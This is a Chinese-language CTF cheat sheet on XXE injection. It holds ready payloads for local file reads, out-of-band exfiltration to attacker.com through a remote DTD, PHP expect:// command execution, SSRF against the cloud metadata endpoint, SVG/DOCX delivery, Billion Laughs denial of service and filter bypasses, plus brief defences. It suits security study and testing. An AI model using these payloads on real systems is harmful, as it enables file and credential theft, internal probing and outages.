# XXE (XML 外部实体注入)

## 概述

XML 外部实体注入（XML External Entity Injection，XXE）是一种针对解析 XML 输入的应用的攻击。攻击者通过构造恶意的 XML 文档，利用外部实体引用读取本地文件、发起 SSRF 请求或执行拒绝服务攻击。XXE 在 CTF 中常出现在 XML 数据交换、SOAP API、SVG 上传、DOCX 解析等场景。

## 常见攻击手法

### 1. 有回显 XXE

- **文件读取**：
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <root>&xxe;</root>
  ```

- **读取 PHP 文件（base64 编码绕过）**：
  ```xml
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
  ```

- **利用参数实体读取文件**：
  ```xml
  <!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "file:///etc/passwd">
    %xxe;
  ]>
  ```

### 2. 无回显 XXE (Blind XXE)

当服务器的响应中不包含文件内容时（无回显），需要使用带外（OOB）技术。

- **带外数据外传 (OOB)**：
  ```xml
  <!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
    %dtd;
  ]>
  <root>&send;</root>
  ```

- **远程 DTD 文件内容**：
  ```xml
  <!ENTITY send SYSTEM "http://attacker.com/?data=%file;">
  ```

- **使用 DNSLog 接收数据**：
  ```xml
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ```
  通过 FTP/DNS/HTTP 将数据传输到攻击者服务器

- **错误回显**：将文件内容拼接到错误消息中抛出
  ```xml
  <!ENTITY xxe SYSTEM "file:///etc/passwd/123">  <!-- 不存在的文件导致的错误信息中可能包含内容 -->
  ```

### 3. Java 中的 XXE

Java 中常见的 XXE 触发点：

- **DocumentBuilderFactory**：`DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(inputStream)`
- **SAXParser**：`SAXParserFactory.newInstance().newSAXParser().parse(inputStream, handler)`
- **XMLReader**：`XMLReaderFactory.createXMLReader().parse(inputStream)`
- **JAXB**：`Unmarshaller.unmarshal(inputStream)`
- **SOAP 消息**：基于 SOAP 协议的 WebService

- **Java 特定利用**：
  ```xml
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    <!ENTITY xxe2 SYSTEM "http://127.0.0.1:8080/admin">
  ]>
  ```

### 4. 命令执行 (PHP)

PHP 中 XXE 配合 expect 扩展可实现命令执行：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

条件：PHP 需安装 `expect` 扩展（默认不安装）

### 5. SSRF via XXE

XXE 不仅可以读取文件，还可以发起 HTTP 请求：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

- **内网端口扫描**：通过响应内容的差异判断端口是否开放
- **云元数据读取**：获取 AWS/Azure/GCP 的临时凭证

### 6. SVG 上传 XXE

当网站允许上传 SVG 图片时，SVG 本质上是 XML，可以嵌入 XXE payload：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="20" y="20">&xxe;</text>
</svg>
```

### 7. DOCX/OOXML XXE

Office 文档（DOCX、XLSX、PPTX）本质上是 ZIP 压缩包，内部包含 XML 文件：

1. 解压 DOCX 文件
2. 在 `[Content_Types].xml` 或 `word/document.xml` 中插入 XXE payload
3. 重新打包为 DOCX 并上传
4. 服务器解析时触发 XXE

### 8. XInclude 攻击

当无法完全控制 DTD 时，可以使用 XInclude（需在文档中特定位置使用）：

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

### 9. DOS 攻击 (Billion Laughs)

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;">
  ...
  <!ENTITY lol9 "&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

通过实体嵌套导致 XML 解析器消耗大量内存和 CPU 资源。

### 10. 绕过方案

- **禁用外部实体**：若服务端部分禁用外部实体，可尝试：
  - 使用 `UTF-8 BOM` 绕过某些检测
  - 使用 HTML 实体编码绕过
  - 使用 `&#x25;`（% 的 HTML 实体编码）绕过参数实体过滤
  - DTDOO（DTD Override）：利用 `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/dtd"> %xxe;]>` 的变体

## 相关工具

| 工具 | 用途 |
|------|------|
| XXEInjector | XXE 自动化检测与利用 |
| OOB XXE Server | 搭建 OOB 接收服务器脚本 |
| Burp Suite | 手动测试 |
| DTD Generator | 生成远程 DTD |

## 防御建议

- 禁用 XML 解析器中的外部实体（DocumentBuilderFactory 的 `setFeature`）
- 使用 JSON 替代 XML 格式
- 对用户上传的 XML/SVG 进行严格的输入验证
- 使用 `XMLInputFactory`（Java StAX）时设置安全属性

## CTF 中的常见考点

- 有回显 XXE 直接读取 /flag 文件
- Blind XXE 通过 OOB 技术将数据传输到攻击者服务器
- SVG 上传触发 XXE
- Java XXE 读取服务器文件或进行 SSRF

## 相关技能

- [SSRF](SSRF.md)
- [文件泄露](文件泄露.md)
- [PHP](PHP.md)
- [Java](Java.md)
- [文件结构](../安全杂项/文件结构.md)
